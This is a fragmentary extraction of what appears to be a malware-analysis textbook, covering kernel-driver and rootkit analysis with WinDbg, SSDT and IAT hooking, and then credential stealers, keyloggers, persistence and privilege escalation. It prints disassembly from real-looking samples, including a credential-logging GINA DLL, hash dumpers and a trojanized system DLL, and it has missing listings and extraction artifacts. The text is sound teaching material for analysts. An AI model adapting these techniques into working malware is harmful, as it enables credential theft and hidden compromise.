04001B3E  push    esi             ; lpServiceStartName
04001B3F  push    esi             ; lpDependencies
04001B40  push    esi             ; lpdwTagId
04001B41  push    esi             ; lpLoadOrderGroup
[Word Count: 25]

04001B42  push    [ebp+lpBinaryPathName] ; lpBinaryPathName
04001B45  push    1               ; dwErrorControl
04001B47  push    3               ; dwStartType
04001B49  push
1               ; dwServiceType
04001B4B  push    0F01FFh         ; dwDesiredAccess
04001B50  push    [ebp+lpDisplayName] ; lpDisplayName
04001B53  push    [ebp+lpDisplayName] ; lpServiceName
04001B56  push    [ebp+hSCManager] ; hSCManager
04001B59  call    ds:__imp__CreateServiceA@52
[Word Count: 43]

Listing 10-4: Creating a service to load a kernel driver
[Word Count: 10]

04001893                 xor     eax, eax
04001895                 push    eax             ; hTemplateFile
04001896                 push    80h             ; dwFlagsAndAttributes
0400189B                 push    2               ; dwCreationDisposition
0400189D                 push    eax             ; lpSecurityAttributes
0400189E                 push    eax             ; dwShareMode
0400189F                 push    ebx             ; dwDesiredAccess
040018A0
push    edi             ; lpFileName
040018A1
call    esi ; CreateFileA
[Word Count: 44]

Listing 10-5: Obtaining a handle to a device object
[Word Count: 9]

Once the malware has a handle to the device, it uses the DeviceIoControl 
function at  to send data to the driver as shown in Listing 10-6.
[Word Count: 27]

04001910  push    0               ; lpOverlapped
04001912  sub     eax, ecx
04001914  lea     ecx, [ebp+BytesReturned]
0400191A  push    ecx             ; lpBytesReturned
0400191B  push    64h             ; nOutBufferSize
0400191D  push    edi             ; lpOutBuffer
0400191E  inc     eax
0400191F  push    eax             ; nInBufferSize
04001920  push    esi             ; lpInBuffer
04001921  push    9C402408h       ; dwIoControlCode
04001926  push    [ebp+hObject]   ; hDevice
0400192C  call    ds:DeviceIoControl
[Word Count: 54]

Listing 10-6: Using DeviceIoControl to communicate from user space to kernel space
[Word Count: 12]

At this point, we’ll switch gears to look at the kernel-mode code. We 
will dynamically analyze the code that will be executed as a result of the 
DeviceIoControl call by debugging the kernel.
The first step is to find the driver in the kernel. If you’re running WinDbg 
with a kernel debugger attached and verbose output enabled, you will be 
alerted whenever a kernel module is loaded. Kernel modules are not loaded 
and unloaded often, so if you are debugging your malware and a kernel 
module is loaded, then you should be suspicious of the module.
[Word Count: 96]

NOTE
When using VMware for kernel debugging, you will see KMixer.sys frequently loaded 
and unloaded. This is normal and not associated with any malicious activity.
[Word Count: 25]

In the following example, we see that the FileWriter.sys driver has been 
loaded in the kernel debugging window. Likely, this is the malicious driver.
[Word Count: 24]

ModLoad: f7b0d000 f7b0e780   FileWriter.sys
[Word Count: 4]

To determine which code is called in the malicious driver, we need to 
find the driver object. Since we know the driver name, we can find the driver 
object with the !drvobj command. Listing 10-7 shows example output:
[Word Count: 38]

kd> !drvobj FileWriter
Driver object (827e3698) is for:
Loading symbols for f7b0d000   FileWriter.sys ->   FileWriter.sys
*** ERROR: Module load completed but symbols could not be loaded for FileWriter.sys
 \Driver\FileWriter
Driver Extension List: (id , addr)
[Word Count: 35]

Listing 10-7: Viewing a driver object for a loaded driver
[Word Count: 10]

NOTE
Sometimes the driver object will have a different name or !drvobj will fail. As an alter-
native, you can browse the driver objects with the !object \Driver command. This 
command lists all the objects in the \Driver namespace, which is one of the root 
namespaces discussed in Chapter 7.
[Word Count: 50]

The driver object is stored at address 0x827e3698 at . Once we have the 
address for the driver object, we can look at its structure using the dt com-
mand, as shown in Listing 10-8.
[Word Count: 35]

kd>dt nt!_DRIVER_OBJECT 0x827e3698
nt!_DRIVER_OBJECT
   +0x000 Type             : 4
   +0x002 Size             : 168
   +0x004 DeviceObject     : 0x826eb030 _DEVICE_OBJECT
   +0x008 Flags            : 0x12
   +0x00c DriverStart      : 0xf7b0d000 
   +0x010 DriverSize       : 0x1780
[Word Count: 29]

+0x014 DriverSection    : 0x828006a8 
   +0x018 DriverExtension  : 0x827e3740 _DRIVER_EXTENSION
   +0x01c DriverName       : _UNICODE_STRING "\Driver\FileWriter"
   +0x024 HardwareDatabase : 0x8066ecd8 _UNICODE_STRING "\REGISTRY\MACHINE\
HARDWARE\DESCRIPTION\SYSTEM"
   +0x028 FastIoDispatch   : (null) 
   +0x02c DriverInit       : 0xf7b0dfcd     long  +0
   +0x030 DriverStartIo    : (null) 
   +0x034 DriverUnload     : 0xf7b0da2a     void  +0
   +0x038 MajorFunction    : [28] 0xf7b0da06     long  +0
[Word Count: 48]

Listing 10-8: Viewing a device object in the kernel
[Word Count: 9]

kd> dd 827e3698+0x38+e*4 L1
827e3708  f7b0da66
kd> u f7b0da66
FileWriter+0xa66:
f7b0da66 6a68            push    68h
f7b0da68 6838d9b0f7      push    offset FileWriter+0x938 (f7b0d938)
f7b0da6d e822faffff      call    FileWriter+0x494 (f7b0d494)
[Word Count: 25]

Listing 10-9: Locating the function for IRP_MJ_DEVICE_CONTROL in a driver object
[Word Count: 11]

Now that we have the address, we can either load the kernel driver into 
IDA Pro or set a breakpoint on that function and continue to analyze it 
within WinDbg. It’s usually easier to start by analyzing the function in IDA 
Pro and then use WinDbg if further analysis is needed. While scanning 
through the IDA Pro output of our malicious example driver, we found the 
code in Listing 10-10, which calls ZwCreateFile and ZwWriteFile to write to a file 
from kernel space.
[Word Count: 83]

Listing 10-10: Code listing for IRP_MJ_DEVICE_CONTROL function
[Word Count: 7]

found the function for DeviceIoControl by adding 0xe*4 to the beginning of 
the major function table because IRP_MJ_DEVICE_CONTROL has a value of 0xe. 
To find the function for read requests, we add 0x3*4 to the beginning of the 
major function table instead of 0xe*4 because the value of IRP_MJ_READ is 0x3.
[Word Count: 51]

kd> !devobj FileWriterDevice
Device object (826eb030) is for:
 Rootkit \Driver\FileWriter DriverObject 827e3698
Current Irp 00000000 RefCount 1 Type 00000022 Flags 00000040
Dacl e13deedc DevExt 00000000 DevObjExt 828eb0e8 
ExtensionFlags (0000000000)  
Device queue is not busy.
[Word Count: 34]

kd>!devhandles 826eb030  
...
Checking handle table for process 0x829001f0
Handle table at e1d09000 with 32 Entries in use
[Word Count: 18]

Checking handle table for process 0x8258d548
Handle table at e1cfa000 with 114 Entries in use
[Word Count: 15]

Checking handle table for process 0x82752da0
Handle table at e1045000 with 18 Entries in use
PROCESS 82752da0  SessionId: 0  Cid: 0410    Peb: 7ffd5000  ParentCid: 075c
    DirBase: 09180240  ObjectTable: e1da0180  HandleCount:  18.
    Image: FileWriterApp.exe
[Word Count: 33]

07b8: Object: 826eb0e8  GrantedAccess: 0012019f
[Word Count: 5]

Now that we know which application is affected, we can find it in user 
space and analyze it using the techniques discussed throughout this book.
We have covered the basics of analyzing malicious kernel drivers. Next, 
we’ll turn to techniques for analyzing rootkits, which are usually imple-
mented as a kernel driver.
[Word Count: 52]

7C90D682mov     eax, 25h        ; NtCreateFile
7C90D687  mov     edx, 7FFE0300h
7C90D68C  call    dword ptr [edx]
7C90D68E  retn    2Ch
[Word Count: 17]

Listing 10-11: Code for NtCreateFile function
[Word Count: 6]

The call to dword ptr[edx] will go to the following instructions:
[Word Count: 11]

7c90eb8b 8bd4  mov     edx,esp
7c90eb8d 0f34  sysenter
[Word Count: 7]

EAX is set to 0x25  in Listing 10-11, the stack pointer is saved in EDX, 
and then the sysenter instruction is called. The value in EAX is the function 
number for NtCreateFile, which will be used as an index into the SSDT when 
the code enters the kernel. Specifically, the address at offset 0x25  in the 
SSDT will be called in kernel mode. Listing 10-12 shows a few entries in 
the SSDT with the entry for NtCreateFile shown at offset 25.
[Word Count: 83]

SSDT[0x22] = 805b28bc (NtCreateaDirectoryObject) 
SSDT[0x23] = 80603be0 (NtCreateEvent) 
SSDT[0x24] = 8060be48 (NtCreateEventPair)
 SSDT[0x25] = 8056d3ca (NtCreateFile)
SSDT[0x26] = 8056bc5c (NtCreateIoCompletion)
SSDT[0x27] = 805ca3ca (NtCreateJobObject)
[Word Count: 25]

Listing 10-12: Several entries of the SSDT table showing NtCreateFile
[Word Count: 10]

kd> lm m nt
...
8050122c  805c9928 805c98d8 8060aea6 805aa334
8050123c  8060a4be 8059cbbc 805a4786 805cb406
8050124c  804feed0 8060b5c4 8056ae64 805343f2
8050125c  80603b90 805b09c0 805e9694 80618a56
8050126c  805edb86 80598e34 80618caa 805986e6
8050127c  805401f0 80636c9c 805b28bc 80603be0
8050128c  8060be48 f7ad94a4 8056bc5c 805ca3ca
8050129c  805ca102 80618e86 8056d4d8 8060c240
805012ac  8056d404 8059fba6 80599202 805c5f8e
[Word Count: 50]

Listing 10-13: A sample SSDT table with one entry overwritten by a rootkit
[Word Count: 13]

kd>lm
...
f7ac7000 f7ac8580   intelide   (deferred)
f7ac9000 f7aca700   dmload     (deferred)
f7ad9000 f7ada680   Rootkit    (deferred)
f7aed000 f7aee280   vmmouse    (deferred)
...
[Word Count: 19]

Listing 10-14: Using the lm command to find which driver contains a particular address
[Word Count: 14]

Once we identify the driver, we will look for the hook code and start 
to analyze the driver. We’ll look for two things: the section of code that 
installs the hook and the function that executes the hook. The simplest way 
to find the function that installs the hook is to search in IDA Pro for data 
references to the hook function. Listing 10-15 is an assembly listing for 
code that hooks the SSDT.
[Word Count: 74]

00010D4F  jl
short loc_10D41
00010D51                     ; CODE XREF: sub_10CE7+5F j
00010D51  mov     dword_10A0C, ecx
00010D57  mov     dword_10A08, ebx
00010D5D  mov
dword ptr [ecx], offset sub_104A4
[Word Count: 25]

Listing 10-15: Rootkit code that installs a hook in the SSDT
[Word Count: 11]

000104A4  mov     edi, edi
000104A6  push    ebp
000104A7  mov     ebp, esp
000104A9  push    [ebp+arg_8]
000104AC  call
sub_10486
000104B1  test    eax, eax
000104B3  jz      short loc_104BB
000104B5  pop     ebp
000104B6  jmp     NtCreateFile
000104BB -----------------------------
000104BB                ; CODE XREF: sub_104A4+F j
000104BB  mov     eax, 0C0000034h
000104C0  pop     ebp
000104C1  retn    2Ch
[Word Count: 49]

Listing 10-16: Listing of the rootkit hook function
[Word Count: 8]

The hook function jumps to the original NtCreateFile function for some 
requests and returns to 0xC0000034 for others. The value 0xC0000034 corre-
sponds to STATUS_OBJECT_NAME_NOT_FOUND. The call at  contains code (not 
shown) that evaluates the ObjectAttributes (which contains information 
about the object, such as filename) of the file that the user-space program
[Word Count: 53]

is attempting to open. The hook function returns a nonzero value if the 
NtCreateFile function is allowed to proceed, or a zero if the rootkit blocks the 
file from being opened. If the hook function returns a zero, the user-space 
applications will receive an error indicating that the file does not exist. This 
will prevent user applications from obtaining a handle to particular files 
while not interfering with other calls to NtCreateFile.
[Word Count: 72]

37:   806cf728 hal!PicSpuriousService37
3d:   806d0b70 hal!HalpApcInterrupt
41:   806d09cc hal!HalpDispatchInterrupt
50:   806cf800 hal!HalpApicRebootService
62:   8298b7e4 atapi!IdePortInterrupt (KINTERRUPT 8298b7a8)
63:   826ef044 NDIS!ndisMIsr (KINTERRUPT 826ef008)
73:   826b9044 portcls!CKsShellRequestor::`vector deleting destructor'+0x26
(KINTERRUPT 826b9008)
            USBPORT!USBPORT_InterruptService (KINTERRUPT 826df008)
82:   82970dd4 atapi!IdePortInterrupt (KINTERRUPT 82970d98)
83:   829e8044 SCSIPORT!ScsiPortInterrupt (KINTERRUPT 829e8008)
93:   826c315c i8042prt!I8042KeyboardInterruptService (KINTERRUPT 826c3120)
a3:   826c2044 i8042prt!I8042MouseInterruptService (KINTERRUPT 826c2008)
b1:   829e5434 ACPI!ACPIInterruptServiceRoutine (KINTERRUPT 829e53f8)
b2:   826f115c serial!SerialCIsrSw (KINTERRUPT 826f1120)
c1:   806cf984 hal!HalpBroadcastCallService
d1:   806ced34 hal!HalpClockInterrupt
e1:   806cff0c hal!HalpIpiHandler
e3:   806cfc70 hal!HalpLocalApicErrorService
fd:   806d0464 hal!HalpProfileInterrupt
fe:   806d0604 hal!HalpPerfInterrupt
[Word Count: 80]

Interrupts going to unnamed, unsigned, or suspicious drivers could indi-
cate a rootkit or other malicious software.
[Word Count: 17]

Throughout this chapter, we have assumed that the malware being analyzed 
includes a user-space component to load it. If you have a malicious driver, but 
no user-space application to install it, you can load the driver using a loader 
such as the OSR Driver Loader tool, as shown in Figure 10-4. This driver loader 
is very easy to use, and it’s free, but it requires registration. Once you have OSR 
Driver Loader installed, simply run the driver loader and specify the driver to 
load, and then click Register Service and Start Service to start the driver.
[Word Count: 96]

Figure 10-4: OSR Driver Loader tool window
[Word Count: 7]

Kernel Issues for Windows Vista, Windows 7, and x64 
Versions
[Word Count: 10]

Several major changes have been made in the newer versions of Windows 
that impact the kernel-debugging process and the effectiveness of kernel 
malware. Most malware still targets x86 machines running Windows XP, 
but as Windows 7 and x64 gain popularity, so will malware targeting those 
systems.
One major change is that since Windows Vista, the boot.ini file is no lon-
ger used to determine which OS to boot. Recall that we used the boot.ini file 
to enable kernel debugging earlier in this chapter. Vista and later versions
[Word Count: 87]

This lab includes both a driver and an executable. You can run the execut-
able from anywhere, but in order for the program to work properly, the 
driver must be placed in the C:\Windows\System32 directory where it was origi-
nally found on the victim computer. The executable is Lab10-01.exe, and the 
driver is Lab10-01.sys.
[Word Count: 54]

1.
Does this program make any direct changes to the registry? (Use procmon 
to check.)
[Word Count: 15]

2.
The user-space program calls the ControlService function. Can you set a 
breakpoint with WinDbg to see what is executed in the kernel as a result 
of the call to ControlService?
[Word Count: 31]

1.
Does this program create any files? If so, what are they?
[Word Count: 12]

2.
Does this program have a kernel component?
[Word Count: 8]

This lab includes a driver and an executable. You can run the executable 
from anywhere, but in order for the program to work properly, the driver 
must be placed in the C:\Windows\System32 directory where it was originally 
found on the victim computer. The executable is Lab10-03.exe, and the driver 
is Lab10-03.sys.
[Word Count: 51]

2.
Once this program is running, how do you stop it?
[Word Count: 11]

M A L W A R E  F U N C T I O N A L I T Y
[Word Count: 20]

So far, we’ve focused on analyzing malware, and to a 
lesser extent, on what malware can do. The goal of this 
and the next three chapters is to familiarize you with 
the most common characteristics of software that iden-
tify it as malware.
[Word Count: 43]

This chapter takes you on a kind of whirlwind tour through the various 
malware behaviors, some of which may already be familiar to you. Our goal is 
to provide a summary of common behaviors, and give you a well-rounded 
foundation of knowledge that will allow you to recognize a variety of mali-
cious applications. We can’t possibly cover all types of malware because new 
malware is always being created with seemingly endless capabilities, but we 
can give you a good understanding of the sorts of things to look for.
[Word Count: 89]

Two commonly encountered types of malware are downloaders and launch-
ers. Downloaders simply download another piece of malware from the Inter-
net and execute it on the local system. Downloaders are often packaged with
[Word Count: 34]

an exploit. Downloaders commonly use the Windows API URLDownloadtoFileA, 
followed by a call to WinExec to download and execute new malware.
A launcher (also known as a loader) is any executable that installs malware 
for immediate or future covert execution. Launchers often contain the 
malware that they are designed to load. We discuss launchers extensively in 
Chapter 12.
[Word Count: 58]

A reverse shell is a connection that originates from an infected machine and 
provides attackers shell access to that machine. Reverse shells are found as 
both stand-alone malware and as components of more sophisticated back-
doors. Once in a reverse shell, attackers can execute commands as if they 
were on the local system.
[Word Count: 53]

Netcat, discussed in Chapter 3, can be used to create a reverse shell by run-
ning it on two machines. Attackers have been known to use Netcat or pack-
age Netcat within other malware.
When Netcat is used as a reverse shell, the remote machine waits for 
incoming connections using the following:
[Word Count: 52]

The –l option sets Netcat to listening mode, and –p is used to set the port 
on which to listen. Next, the victim machine connects out and provides the 
shell using the following command:
[Word Count: 34]

The listener_ip 80 parts are the IP address and port on the remote 
machine. The -e option is used to designate a program to execute once the 
connection is established, tying the standard input and output from the pro-
gram to the socket (on Windows, cmd.exe is often used, as discussed next).
[Word Count: 52]

A remote administration tool (RAT) is used to remotely manage a computer or 
computers. RATs are often used in targeted attacks with specific goals, such 
as stealing information or moving laterally across a network.
Figure 11-1 shows the RAT network structure. The server is running on 
a victim host implanted with malware. The client is running remotely as the 
command and control unit operated by the attacker. The servers beacon to 
the client to start a connection, and they are controlled by the client. RAT 
communication is typically over common ports like 80 and 443.
[Word Count: 95]

NOTE
Poison Ivy (http://www.poisonivy-rat.com/) is a freely available and popular RAT. 
Its functionality is controlled by shellcode plug-ins, which makes it extensible. Poison 
Ivy can be a useful tool for quickly generating malware samples to test or analyze.
[Word Count: 38]

A botnet is a collection of compromised hosts, known as zombies, that are con-
trolled by a single entity, usually through the use of a server known as a botnet 
controller. The goal of a botnet is to compromise as many hosts as possible in 
order to create a large network of zombies that the botnet uses to spread 
additional malware or spam, or perform a distributed denial-of-service (DDoS) 
attack. Botnets can take a website offline by having all of the zombies attack 
the website at the same time.
[Word Count: 89]

There are a few key differences between botnets and RATs:
[Word Count: 10]


Botnets have been known to infect and control millions of hosts. RATs 
typically control far fewer hosts.
[Word Count: 18]


All botnets are controlled at once. RATs are controlled on a per-victim 
basis because the attacker is interacting with the host at a much more 
intimate level.
[Word Count: 28]


RATs are used in targeted attacks. Botnets are used in mass attacks.
[Word Count: 13]

Attackers often go to great lengths to steal credentials, primarily with three 
types of malware:
[Word Count: 15]


Programs that wait for a user to log in in order to steal their credentials
[Word Count: 16]


Programs that dump information stored in Windows, such as password 
hashes, to be used directly or cracked offline
[Word Count: 19]

In this section, we will discuss each of these types of malware.
[Word Count: 12]

Action
Action
Action
Action
Action
Action
Action
Action
[Word Count: 8]

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL
[Word Count: 2]

In one instance, we found a malicious file fsgina.dll installed in this regis-
try location as a GINA interceptor.
Figure 11-2 shows an example of the way that logon credentials flow 
through a system with a malicious file between Winlogon and msgina.dll. The 
malware (fsgina.dll) is able to capture all user credentials submitted to the 
system for authentication. It can log that information to disk or pass it over 
the network.
[Word Count: 71]

Figure 11-2: Malicious fsgina.dll sits in between the Windows system files to cap-
ture data.
[Word Count: 15]

100014A0 WlxLoggedOutSAS 
100014A0         push    esi
100014A1         push    edi
100014A2         push    offset aWlxloggedout_0 ; "WlxLoggedOutSAS"
100014A7         call    Call_msgina_dll_function 
[Word Count: 18]

...
100014FB         push    eax ; Args
100014FC         push    offset aUSDSPSOpS ;"U: %s D: %s P: %s OP: %s"
10001501         push    offset aDRIVERS ; "drivers\tcpudp.sys"
10001503         call    Log_To_File 
[Word Count: 28]

Listing 11-1: GINA DLL WlxLoggedOutSAS export function for logging stolen credentials
[Word Count: 11]

As you can see at , the credential information is immediately passed to 
msgina.dll by the call we have labeled Call_msgina_dll_function. This function 
dynamically resolves and calls WlxLoggedOutSAS in msgina.dll, which is passed in 
as a parameter. The call at  performs the logging. It takes parameters of the 
credential information, a format string that will be used to print the creden-
tials, and the log filename. As a result, all successful user logons are logged to 
%SystemRoot%\system32\drivers\tcpudp.sys. The log includes the username, 
domain, password, and old password.
[Word Count: 88]

can easily change the name to make it less obvious. Next, try to determine 
the API functions used by the exports. Many of these functions will be 
dynamically resolved, so the hash dumping exports often call GetProcAddress 
many times.
Listing 11-2 shows the code in the exported function GrabHash from a 
pwdump variant DLL. Since this DLL was injected into lsass.exe, it must man-
ually resolve numerous symbols before using them.
[Word Count: 71]

Listing 11-2: Unique API calls used by a pwdump variant’s export function GrabHash
[Word Count: 13]

The PSH Toolkit contains programs that dump hashes, the most popular 
of which is known as whosthere-alt. whosthere-alt dumps the SAM by inject-
ing a DLL into lsass.exe, but using a completely different set of API functions 
from pwdump. Listing 11-3 shows code from a whosthere-alt variant that 
exports a function named TestDump.
[Word Count: 53]

10001119        push    offset LibFileName ; "secur32.dll"
1000111E        call    ds:LoadLibraryA
10001130        push    offset ProcName ; "LsaEnumerateLogonSessions"
10001135        push    esi             ; hModule
10001136        call    ds:GetProcAddress 
...
10001670        call    ds:GetSystemDirectoryA
10001676        mov     edi, offset aMsv1_0_dll ; \\msv1_0.dll
...
100016A6        push    eax             ; path to msv1_0.dll
100016A9        call    ds:GetModuleHandleA 
[Word Count: 47]

Listing 11-3: Unique API calls used by a whosthere-alt variant’s export function TestDump
[Word Count: 13]

Since this DLL is injected into lsass.exe, its TestDump function performs 
the hash dumping. This export dynamically loads secur32.dll and resolves its 
LsaEnumerateLogonSessions function at  to obtain a list of locally unique iden-
tifiers (known as LUIDs). This list contains the usernames and domains for 
each logon and is iterated through by the DLL, which gets access to the cre-
dentials by finding a nonexported function in the msv1_0.dll Windows DLL 
in the memory space of lsass.exe using the call to GetModuleHandle shown at . 
This function, NlpGetPrimaryCredential, is used to dump the NT and LM 
hashes.
[Word Count: 98]

NOTE
While it is important to recognize the dumping technique, it might be more critical to 
determine what the malware is doing with the hashes. Is it storing them on a disk, post-
ing them to a website, or using them in a pass-the-hash attack? These details could be 
really important, so identifying the low-level hash dumping method should be avoided 
until the overall functionality is determined.
[Word Count: 67]

Keylogging is a classic form of credential stealing. When keylogging, malware 
records keystrokes so that an attacker can observe typed data like usernames 
and passwords. Windows malware uses many forms of keylogging.
[Word Count: 32]

Kernel-based keyloggers are difficult to detect with user-mode applications. 
They are frequently part of a rootkit and they can act as keyboard drivers to 
capture keystrokes, bypassing user-space programs and protections.
[Word Count: 31]

Figure 11-3: Loop structure of GetAsyncKeyState and GetForegroundWindow 
keylogger
[Word Count: 9]

Call GetForegroundWindow 
Log if new window
[Word Count: 6]

Call GetAsyncKeyState 
Check Shift and Caps Lock
Log if new key pressed
[Word Count: 12]

Listing 11-4 shows the loop structure in Figure 11-3 disassembled.
[Word Count: 10]

00401162         call    ds:GetForegroundWindow
...
00401272         push    10h                    ; nVirtKey Shift
00401274         call    ds:GetKeyState
0040127A         mov     esi, dword_403308[ebx] 
00401280         push    esi                     ; vKey
00401281         movsx   edi, ax
00401284         call    ds:GetAsyncKeyState
0040128A         test    ah, 80h
0040128D         jz      short loc_40130A
0040128F         push    14h                     ; nVirtKey Caps Lock
00401291         call    ds:GetKeyState
...
004013EF         add     ebx, 4 
004013F2         cmp     ebx, 368
004013F8         jl      loc_401272
[Word Count: 62]

Listing 11-4: Disassembly of GetAsyncKeyState and GetForegroundWindow keylogger
[Word Count: 8]

Identifying Keyloggers in Strings Listings
[Word Count: 5]

You can recognize keylogger functionality in malware by looking at the 
imports for the API functions, or by examining the strings listing for indica-
tors, which is particularly useful if the imports are obfuscated or the malware 
is using keylogging functionality that you have not encountered before. For 
example, the following listing of strings is from the keylogger described in 
the previous section:
[Word Count: 63]

[Up]
[Num Lock]
[Down]
[Right]
[UP]
[Left]
[PageDown]
[Word Count: 8]

If a keylogger wants to log all keystrokes, it must have a way to print keys 
like PAGE DOWN, and must have access to these strings. Working backward 
from the cross-references to these strings can be a way to recognize keylog-
ging functionality in malware.
[Word Count: 45]

When we discussed the Windows registry in Chapter 7, we noted that it is 
common for malware to access the registry to store configuration informa-
tion, gather information about the system, and install itself persistently. You 
have seen in labs and throughout the book that the following registry key is a 
popular place for malware to install itself:
[Word Count: 58]

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
[Word Count: 1]

Malware authors can gain persistence for their DLLs though a special regis-
try location called AppInit_DLL. AppInit_DLLs are loaded into every process 
that loads User32.dll, and a simple insertion into the registry will make 
AppInit_DLLs persistent.
The AppInit_DLLs value is stored in the following Windows registry key:
[Word Count: 47]

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
[Word Count: 2]

The AppInit_DLLs value is of type REG_SZ and consists of a space-delimited 
string of DLLs. Most processes load User32.dll, and all of those processes also 
load the AppInit_DLLs. Malware authors often target individual processes, 
but AppInit_DLLs will be loaded into many processes. Therefore, malware 
authors must check to see in which process the DLL is running before exe-
cuting their payload. This check is often performed in DllMain of the mali-
cious DLL.
[Word Count: 73]

Malware authors can hook malware to a particular Winlogon event, such as 
logon, logoff, startup, shutdown, and lock screen. This can even allow the 
malware to load in safe mode. The registry entry consists of the Notify value 
in the following registry key:
[Word Count: 43]

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
[Word Count: 2]

When winlogon.exe generates an event, Windows checks the Notify regis-
try key for a DLL that will handle it.
[Word Count: 19]

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
[Word Count: 2]

Services are defined in the registry at the following location:
[Word Count: 10]

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName
[Word Count: 1]

Windows services contain many registry values, most of which provide 
information about the service, such as DisplayName and Description. Malware 
authors often set values that help the malware blend in, such as NetWareMan, 
which “Provides access to file and print resources on NetWare networks.” 
Another service registry value is ImagePath, which contains the location of 
the service executable. In the case of an svchost.exe DLL, this value contains 
%SystemRoot%/System32/svchost.exe –k GroupName.
All svchost.exe DLLs contain a Parameters key with a ServiceDLL value, which 
the malware author sets to the location of the malicious DLL. The Start
[Word Count: 96]

Listing 11-5 shows the malicious code that was inserted into the infected 
rtutils.dll.
[Word Count: 13]

Table 11-1: rtutils.dll’s DLL Entry Point Before and After Trojanization
[Word Count: 10]

DllEntryPoint(HINSTANCE hinstDLL, 
DWORD fdwReason, LPVOID lpReserved)
[Word Count: 6]

mov   edi, edi
push  ebp
mov   ebp, esp
push  ebx
mov   ebx, [ebp+8]
push  esi
mov   esi, [ebp+0Ch]
[Word Count: 18]

DllEntryPoint(HINSTANCE hinstDLL, 
DWORD fdwReason, LPVOID lpReserved)
[Word Count: 6]

76E8A660 DllEntryPoint_0 
76E8A660        pusha
76E8A661        call  sub_76E8A667 
76E8A666        nop
76E8A667 sub_76E8A667 
76E8A667        pop   ecx
76E8A668        mov   eax, ecx
76E8A66A        add   eax, 24h 
76E8A66D        push  eax 
76E8A66E        add   ecx, 0FFFF69E2h
76E8A674        mov   eax, [ecx]
76E8A677        add   eax, 0FFF00D7Bh
76E8A67C        call  eax ; LoadLibraryA
76E8A67E        popa
76E8A67F        mov   edi, edi 
76E8A681        push  ebp
76E8A682        mov   ebp, esp
76E8A684        jmp   loc_76E81BB2
...
76E8A68A        aMsconf32_dll db 'msconf32.dll',0 
[Word Count: 66]

Listing 11-5: Malicious patch of code inserted into a system DLL
[Word Count: 11]

DLL load-order hijacking is a simple, covert technique that allows malware 
authors to create persistent, malicious DLLs without the need for a registry 
entry or trojanized binary. This technique does not even require a separate 
malicious loader, as it capitalizes on the way DLLs are loaded by Windows.
[Word Count: 48]

The default search order for loading DLLs on Windows XP is as follows:
[Word Count: 13]

1.
The directory from which the application loaded
[Word Count: 8]

3.
The system directory (the GetSystemDirectory function is used to get the 
path, such as …/Windows/System32/)
[Word Count: 16]

4.
The 16-bit system directory (such as …/Windows/System/)
[Word Count: 8]

5.
The Windows directory (the GetWindowsDirectory function is used to get 
the path, such as …/Windows/)
[Word Count: 16]

6.
The directories listed in the PATH environment variable
[Word Count: 9]

00401003
lea     eax, [esp+1Ch+TokenHandle]
00401006
push    eax                     ; TokenHandle
00401007
push    (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY) 
; DesiredAccess
00401009
call    ds:GetCurrentProcess
0040100F
push    eax                     ; ProcessHandle
00401010
call    ds:OpenProcessToken 
00401016
test    eax, eax
00401018
jz      short loc_401080
0040101A
lea     ecx, [esp+1Ch+Luid]
0040101E
push    ecx                     ; lpLuid
0040101F
push    offset Name             ; "SeDebugPrivilege"
00401024
push    0                       ; lpSystemName
00401026
call    ds:LookupPrivilegeValueA
0040102C
test    eax, eax
0040102E
jnz     short loc_40103E
...
0040103E
mov     eax, [esp+1Ch+Luid.LowPart]
00401042
mov     ecx, [esp+1Ch+Luid.HighPart]
00401046
push    0                       ; ReturnLength
00401048
push    0                       ; PreviousState
0040104A
push    10h                     ; BufferLength
[Word Count: 91]

0040104C
lea     edx, [esp+28h+NewState]
00401050
push    edx                     ; NewState
00401051
mov     [esp+2Ch+NewState.Privileges.Luid.LowPt], eax 
00401055
mov     eax, [esp+2Ch+TokenHandle]
00401059
push    0                    ; DisableAllPrivileges
0040105B
push    eax                  ; TokenHandle
0040105C
mov    [esp+34h+NewState.PrivilegeCount], 1
00401064
mov    [esp+34h+NewState.Privileges.Luid.HighPt], ecx 
00401068
mov    [esp+34h+NewState.Privileges.Attributes], SE_PRIVILEGE_ENABLED 
00401070
call   ds:AdjustTokenPrivileges 
[Word Count: 46]

Listing 11-6: Setting the access token to SeDebugPrivilege
[Word Count: 8]

Here we’ll introduce you to a couple of user-space rootkit techniques, to 
give you a general understanding of how they work and how to recognize 
them in the field. (There are entire books devoted to rootkits, and we’ll only 
scratch the surface in this section.)
A good strategy for dealing with rootkits that install hooks at the user 
level is to first determine how the hook is placed, and then figure out what 
the hook is doing. Now we will look at the IAT and inline hooking techniques.
[Word Count: 88]

Figure 11-4: IAT hooking of TerminateProcess. The top path is the normal flow, and the bottom path is the flow 
with a rootkit.
[Word Count: 23]

The IAT technique is an old and easily detectable form of hooking, 
so many modern rootkits use the more advanced inline hooking method 
instead.
[Word Count: 24]

Inline hooking overwrites the API function code contained in the imported 
DLLs, so it must wait until the DLL is loaded to begin executing. IAT hook-
ing simply modifies the pointers, but inline hooking changes the actual func-
tion code.
A malicious rootkit performing inline hooking will often replace the 
start of the code with a jump that takes the execution to malicious code
[Word Count: 64]

7C80180E   push 20
7C801810   push kernel32.7C809BA8
7C801815   call kernel32.7C8024C6
7C80181A   xor ebx, ebx
7C80181C   mov ecx,dword ptr ss:[ebp+14]
7C80181F   cmp ecx, ebx
7C801821   je short  kernel32.7C801825
7C801823   mov ptr ds:[ecx],ebx
...
[Word Count: 31]

10003044    7C801E16 - CreateProcessA
10003048    7C80180E - TerminateProcess
1000304C    7C863D2C - ReadFile
10003050    7C863EB7 - Process32First
10001BCA    push    0                       
10001BCC    mov     eax, [ebp+hProcess]
10001BCF    push    eax                     
10001BD0    call    ds: TerminateProcess

[Word Count: 31]

10003044    7C801E16 - CreateProcessA
10003048    34200000 - Rootkit Code
1000304C    7C863D2C - ReadFile
10003050    7C863EB7 - Process32First
[Word Count: 17]

inserted by the rootkit. Alternatively, the rootkit can alter the code of the 
